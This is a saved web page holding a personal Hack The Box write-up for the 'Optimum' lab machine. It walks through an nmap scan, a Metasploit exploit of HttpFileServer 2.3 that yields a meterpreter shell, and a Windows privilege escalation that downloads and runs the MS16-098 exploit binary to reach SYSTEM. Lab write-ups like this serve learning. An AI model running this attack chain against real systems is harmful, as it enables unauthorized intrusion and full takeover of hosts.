<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Optimum | Omar2535</title>
    <meta name="generator" content="VuePress 1.9.10">
    
    <meta name="description" content="Notes">
    
    <link rel="preload" href="/assets/css/0.styles.de540ae2.css" as="style"><link rel="preload" href="/assets/js/app.e90b9e2c.js" as="script"><link rel="preload" href="/assets/js/2.53b2ba1e.js" as="script"><link rel="preload" href="/assets/js/1.cc48f7d2.js" as="script"><link rel="preload" href="/assets/js/87.0c5929f3.js" as="script"><link rel="prefetch" href="/assets/js/10.fc1976ac.js"><link rel="prefetch" href="/assets/js/100.802379ba.js"><link rel="prefetch" href="/assets/js/101.30b4b6e0.js"><link rel="prefetch" href="/assets/js/102.0d4fb7b7.js"><link rel="prefetch" href="/assets/js/103.16270e29.js"><link rel="prefetch" href="/assets/js/104.e764e46c.js"><link rel="prefetch" href="/assets/js/105.a445ecda.js"><link rel="prefetch" href="/assets/js/11.3fce9d23.js"><link rel="prefetch" href="/assets/js/12.dc96233c.js"><link rel="prefetch" href="/assets/js/13.1e689f64.js"><link rel="prefetch" href="/assets/js/14.e1329e2d.js"><link rel="prefetch" href="/assets/js/15.67f7e054.js"><link rel="prefetch" href="/assets/js/16.2ecd0653.js"><link rel="prefetch" href="/assets/js/17.798e9394.js"><link rel="prefetch" href="/assets/js/18.03a744a4.js"><link rel="prefetch" href="/assets/js/19.975dd7c7.js"><link rel="prefetch" href="/assets/js/20.c1b6bd0d.js"><link rel="prefetch" href="/assets/js/21.88b275c9.js"><link rel="prefetch" href="/assets/js/22.ef911ad5.js"><link rel="prefetch" href="/assets/js/23.df6ce246.js"><link rel="prefetch" href="/assets/js/24.ba61c33c.js"><link rel="prefetch" href="/assets/js/25.3195c123.js"><link rel="prefetch" href="/assets/js/26.3d0f6a9a.js"><link rel="prefetch" href="/assets/js/27.92afec31.js"><link rel="prefetch" href="/assets/js/28.2565fed9.js"><link rel="prefetch" href="/assets/js/29.9c8ed229.js"><link rel="prefetch" href="/assets/js/3.74092176.js"><link rel="prefetch" href="/assets/js/30.817fadc8.js"><link rel="prefetch" href="/assets/js/31.e95af4f7.js"><link rel="prefetch" href="/assets/js/32.65c1a09c.js"><link rel="prefetch" href="/assets/js/33.2d7964f4.js"><link rel="prefetch" href="/assets/js/34.4f59fa55.js"><link rel="prefetch" href="/assets/js/35.493484d8.js"><link rel="prefetch" href="/assets/js/36.a9fd784e.js"><link rel="prefetch" href="/assets/js/37.59f79452.js"><link rel="prefetch" href="/assets/js/38.543508ec.js"><link rel="prefetch" href="/assets/js/39.5de45353.js"><link rel="prefetch" href="/assets/js/4.a791e2ff.js"><link rel="prefetch" href="/assets/js/40.7faa7d8a.js"><link rel="prefetch" href="/assets/js/41.80e1e691.js"><link rel="prefetch" href="/assets/js/42.6fe9445e.js"><link rel="prefetch" href="/assets/js/43.e9329d79.js"><link rel="prefetch" href="/assets/js/44.32cc9330.js"><link rel="prefetch" href="/assets/js/45.f1610206.js"><link rel="prefetch" href="/assets/js/46.f274e4ef.js"><link rel="prefetch" href="/assets/js/47.1555cf29.js"><link rel="prefetch" href="/assets/js/48.9c505bfd.js"><link rel="prefetch" href="/assets/js/49.7c1675a4.js"><link rel="prefetch" href="/assets/js/5.213e8a2f.js"><link rel="prefetch" href="/assets/js/50.d752392d.js"><link rel="prefetch" href="/assets/js/51.44c263fa.js"><link rel="prefetch" href="/assets/js/52.bdd1809f.js"><link rel="prefetch" href="/assets/js/53.7cf056c5.js"><link rel="prefetch" href="/assets/js/54.aad110c0.js"><link rel="prefetch" href="/assets/js/55.1f1d59a8.js"><link rel="prefetch" href="/assets/js/56.4bdb98d5.js"><link rel="prefetch" href="/assets/js/57.df2c4b8a.js"><link rel="prefetch" href="/assets/js/58.cd5ccc48.js"><link rel="prefetch" href="/assets/js/59.7926c0a7.js"><link rel="prefetch" href="/assets/js/6.759a3df7.js"><link rel="prefetch" href="/assets/js/60.684e9e0f.js"><link rel="prefetch" href="/assets/js/61.d8f705f9.js"><link rel="prefetch" href="/assets/js/62.35151300.js"><link rel="prefetch" href="/assets/js/63.e354ea08.js"><link rel="prefetch" href="/assets/js/64.98c17167.js"><link rel="prefetch" href="/assets/js/65.ce422c7c.js"><link rel="prefetch" href="/assets/js/66.22abb726.js"><link rel="prefetch" href="/assets/js/67.a09ec169.js"><link rel="prefetch" href="/assets/js/68.642bfba7.js"><link rel="prefetch" href="/assets/js/69.89db523c.js"><link rel="prefetch" href="/assets/js/7.2b5aa5ce.js"><link rel="prefetch" href="/assets/js/70.f9b2468f.js"><link rel="prefetch" href="/assets/js/71.982a3d97.js"><link rel="prefetch" href="/assets/js/72.75edbe60.js"><link rel="prefetch" href="/assets/js/73.0f515ae3.js"><link rel="prefetch" href="/assets/js/74.52f434ef.js"><link rel="prefetch" href="/assets/js/75.4bd299d5.js"><link rel="prefetch" href="/assets/js/76.51b91894.js"><link rel="prefetch" href="/assets/js/77.494a4447.js"><link rel="prefetch" href="/assets/js/78.c17fe7b0.js"><link rel="prefetch" href="/assets/js/79.543318f8.js"><link rel="prefetch" href="/assets/js/80.0b97115b.js"><link rel="prefetch" href="/assets/js/81.66d869c7.js"><link rel="prefetch" href="/assets/js/82.8e8926e8.js"><link rel="prefetch" href="/assets/js/83.dff10bf7.js"><link rel="prefetch" href="/assets/js/84.2ac781a8.js"><link rel="prefetch" href="/assets/js/85.60293f19.js"><link rel="prefetch" href="/assets/js/86.46d7126b.js"><link rel="prefetch" href="/assets/js/88.9e892158.js"><link rel="prefetch" href="/assets/js/89.5cceac4c.js"><link rel="prefetch" href="/assets/js/90.be2516f3.js"><link rel="prefetch" href="/assets/js/91.750b3c5c.js"><link rel="prefetch" href="/assets/js/92.8d607653.js"><link rel="prefetch" href="/assets/js/93.b7d0bb09.js"><link rel="prefetch" href="/assets/js/94.8d3e3ddd.js"><link rel="prefetch" href="/assets/js/95.a036ab7d.js"><link rel="prefetch" href="/assets/js/96.f6e35d5a.js"><link rel="prefetch" href="/assets/js/97.6d0c1d57.js"><link rel="prefetch" href="/assets/js/98.df2da740.js"><link rel="prefetch" href="/assets/js/99.83ea7e0f.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.b1b44aa7.js">
    <link rel="stylesheet" href="/assets/css/0.styles.de540ae2.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Omar2535</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/misc/Accomplishments/" class="sidebar-link">Accomplishments</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Certs/" class="sidebar-heading clickable"><span>Certs</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Courses/" class="sidebar-heading clickable"><span>Courses</span> <span class="arrow right"></span></a> <!----></section></li><li><a href="/misc/Guides/" class="sidebar-link">Guides</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Hackthebox/" class="sidebar-heading clickable router-link-active open"><span>Hackthebox</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/misc/Hackthebox/arctic.html" class="sidebar-link">Arctic</a></li><li><a href="/misc/Hackthebox/bashed.html" class="sidebar-link">Bashed</a></li><li><a href="/misc/Hackthebox/bastard.html" class="sidebar-link">Bastard</a></li><li><a href="/misc/Hackthebox/beep.html" class="sidebar-link">Beep</a></li><li><a href="/misc/Hackthebox/blue.html" class="sidebar-link">Blue</a></li><li><a href="/misc/Hackthebox/bounty.html" class="sidebar-link">Bounty</a></li><li><a href="/misc/Hackthebox/cronos.html" class="sidebar-link">Chronos</a></li><li><a href="/misc/Hackthebox/devel.html" class="sidebar-link">Devel</a></li><li><a href="/misc/Hackthebox/frolic.html" class="sidebar-link">Frolic</a></li><li><a href="/misc/Hackthebox/grandpa.html" class="sidebar-link">Grandpa</a></li><li><a href="/misc/Hackthebox/granny.html" class="sidebar-link">Granny</a></li><li><a href="/misc/Hackthebox/haircut.html" class="sidebar-link">Haircut</a></li><li><a href="/misc/Hackthebox/irkerd.html" class="sidebar-link">Irked</a></li><li><a href="/misc/Hackthebox/jeeves.html" class="sidebar-link">Jeeves</a></li><li><a href="/misc/Hackthebox/jerry.html" class="sidebar-link">Jerry</a></li><li><a href="/misc/Hackthebox/lame.html" class="sidebar-link">Lame</a></li><li><a href="/misc/Hackthebox/legacy.html" class="sidebar-link">Legacy</a></li><li><a href="/misc/Hackthebox/mango.html" class="sidebar-link">Mango</a></li><li><a href="/misc/Hackthebox/netmon.html" class="sidebar-link">Netmon</a></li><li><a href="/misc/Hackthebox/nibbles.html" class="sidebar-link">Nibbles</a></li><li><a href="/misc/Hackthebox/october.html" class="sidebar-link">October</a></li><li><a href="/misc/Hackthebox/optimum.html" aria-current="page" class="active sidebar-link">Optimum</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/misc/Hackthebox/optimum.html#initial-scan" class="sidebar-link">Initial scan</a></li><li class="sidebar-sub-header"><a href="/misc/Hackthebox/optimum.html#gobuster" class="sidebar-link">Gobuster</a></li><li class="sidebar-sub-header"><a href="/misc/Hackthebox/optimum.html#metasploit" class="sidebar-link">Metasploit</a></li><li class="sidebar-sub-header"><a href="/misc/Hackthebox/optimum.html#privilege-escalation" class="sidebar-link">Privilege escalation</a></li></ul></li><li><a href="/misc/Hackthebox/popcorn.html" class="sidebar-link">Popcorn</a></li><li><a href="/misc/Hackthebox/shocker.html" class="sidebar-link">Shocker</a></li><li><a href="/misc/Hackthebox/silo.html" class="sidebar-link">Silo</a></li><li><a href="/misc/Hackthebox/traverxec.html" class="sidebar-link">Traverxec</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Root-me/" class="sidebar-heading clickable"><span>Root-me</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Tryhackme/" class="sidebar-heading clickable"><span>Tryhackme</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Writeups/" class="sidebar-heading clickable"><span>Writeups</span> <span class="arrow right"></span></a> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="optimum"><a href="#optimum" class="header-anchor">#</a> Optimum</h1> <p>10.10.10.8</p> <h2 id="initial-scan"><a href="#initial-scan" class="header-anchor">#</a> Initial scan</h2> <div class="language-sh extra-class"><pre class="language-sh"><code>nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-T5</span> -p- <span class="token number">10.10</span>.10.8
</code></pre></div><p>Results</p> <div class="language- extra-class"><pre class="language-text"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 06:05 EDT
Nmap scan report for 10.10.10.8
Host is up (0.20s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.73 seconds
</code></pre></div><h2 id="gobuster"><a href="#gobuster" class="header-anchor">#</a> Gobuster</h2> <p>Since there's only 1 port, let's try gobuster on this</p> <div class="language-sh extra-class"><pre class="language-sh"><code>gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> <span class="token number">10.10</span>.10.8 <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</code></pre></div><p>This takes too long. Going to let it run in the background while looking for other exploits</p> <h2 id="metasploit"><a href="#metasploit" class="header-anchor">#</a> Metasploit</h2> <p>Looking online, there's an exploit for this specific version of http file server version 2.3.</p> <div class="language-sh extra-class"><pre class="language-sh"><code>msfconsole
use exploit/windows/http/rejetto_hfs_exec
msf5 exploit<span class="token punctuation">(</span>windows/http/rejetto_hfs_exec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">10.10</span>.10.8
<span class="token comment"># rhosts =&gt; 10.10.10.8</span>
msf5 exploit<span class="token punctuation">(</span>windows/http/rejetto_hfs_exec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> SRVHOST <span class="token number">10.10</span>.14.14
<span class="token comment"># SRVHOST =&gt; 10.10.14.14</span>
msf5 exploit<span class="token punctuation">(</span>windows/http/rejetto_hfs_exec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> SRVPORT <span class="token number">8080</span>
<span class="token comment"># SRVPORT =&gt; 8080</span>
msf5 exploit<span class="token punctuation">(</span>windows/http/rejetto_hfs_exec<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
</code></pre></div><p>and a meterpreter shell is spawned. This gives us our first flag for the user <code>OPTIMUM\kostas</code></p> <h2 id="privilege-escalation"><a href="#privilege-escalation" class="header-anchor">#</a> Privilege escalation</h2> <p>Let's look for some windows security vulnerabilities within this windows version.</p> <h3 id="getting-systeminfo"><a href="#getting-systeminfo" class="header-anchor">#</a> Getting systeminfo</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>execute <span class="token parameter variable">-f</span> <span class="token string">&quot;cmd.exe /c systeminfo &gt; systeminfo.txt&quot;</span>
download systeminfo.txt
</code></pre></div><h3 id="installing-windows-exploit-suggester"><a href="#installing-windows-exploit-suggester" class="header-anchor">#</a> Installing windows-exploit-suggester</h3> <p>Install windows-exploit-suggester from here: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener noreferrer">exploit-suggester<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>unzip the file and add it to <code>/usr/local/bin</code></p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">unzip</span> Windows-exploit-suggester
<span class="token builtin class-name">cd</span> Windows-expolit-suggester
suco <span class="token function">cp</span> Windows-exploit-suggester.py /usr/local/bin
</code></pre></div><h3 id="using-windows-expolit-suggester"><a href="#using-windows-expolit-suggester" class="header-anchor">#</a> Using windows-expolit-suggester</h3> <p>Make sure the sysinfo.txt file and the database file is placed in the same directory, then</p> <div class="language-sh extra-class"><pre class="language-sh"><code>windows-exploit-suggest.py <span class="token parameter variable">--update</span>
windows-exploit-suggester.py <span class="token parameter variable">--database</span> <span class="token number">2020</span>-04-10-mssb.xls <span class="token parameter variable">--systeminfo</span> systeminfo.txt
</code></pre></div><p>result:</p> <div class="language- extra-class"><pre class="language-text"><code>[*] initiating winsploit version 3.3...                                                                                                                                      
[*] database file detected as xls or xlsx based on extension                                                                                                                 
[*] attempting to read from the systeminfo input file                                                                                                                        
[+] systeminfo input file read successfully (ISO-8859-1)                                                                                                                     
[*] querying database file for potential vulnerabilities                                                                                                                     
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits                                                                 
[*] there are now 246 remaining vulns                                                                                                                                        
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin                                                                                                           
[+] windows version identified as 'Windows 2012 R2 64-bit'                                                                                                                   
[*]                                                                                                                                                                          
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                                                                                          
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)                                                           
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)                         
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255                                                                                                            
[*]                                                                                                                                                                          
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important                                                                                          
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)                                                         
[*]                                                                                                                                                                          
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important                                                                                                   
[*]   https://github.com/foxglovesec/RottenPotato                                                                                                                            
[*]   https://github.com/Kevin-Robertson/Tater                                                                                                                               
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege                                          
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation                                                                       
[*]                                                                                                                                                                          
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important                                                                                         
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074),
 PoC                                                                                                                                                                         
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC                                            
[*]                                                                                                                                                                          
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical                                                                                          
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
...
</code></pre></div><p>The most interesting result so far is MS16–098. So let's try that.</p> <h3 id="msfconsole"><a href="#msfconsole" class="header-anchor">#</a> Msfconsole</h3> <p>first, background the meterpreter session. Then:</p> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">wget</span> https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
sessions <span class="token operator">&lt;</span>meterpreter session ID<span class="token operator">&gt;</span>
upload <span class="token number">41020</span>.exe
shell
<span class="token number">41020</span>.exe
<span class="token function">whoami</span> <span class="token comment"># system</span>
</code></pre></div></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/misc/Hackthebox/october.html" class="prev">
        October
      </a></span> <span class="next"><a href="/misc/Hackthebox/popcorn.html">
        Popcorn
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"><!----><!----></div></div>
    <script src="/assets/js/app.e90b9e2c.js" defer></script><script src="/assets/js/2.53b2ba1e.js" defer></script><script src="/assets/js/1.cc48f7d2.js" defer></script><script src="/assets/js/87.0c5929f3.js" defer></script>
  </body>
</html>
